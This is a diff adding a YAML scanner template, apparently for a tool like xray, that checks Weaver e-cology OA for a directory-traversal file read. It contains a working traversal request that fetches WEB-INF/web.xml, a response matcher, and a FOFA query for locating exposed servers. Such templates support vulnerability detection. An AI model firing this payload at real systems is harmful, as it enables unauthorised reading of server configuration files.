@@ -1,0 +1,22 @@
+id: ecology-filedownload-lfi
+
+info:
+  name: 泛微 OA ecology 本地文件读取
+  author: l1nk3r
+  severity: high
+  verified: true
+  description: |-
+    泛微OA e-cology 文件下载目录遍历
+    fofa: app="泛微-协同办公OA"
+  reference:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
+  tags: ecology,directory-traversal
+  created: 2023/06/23
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+    expression: response.status == 200 && response.body.bcontains(b"<url-pattern>/weaver/")
+expression: r0()
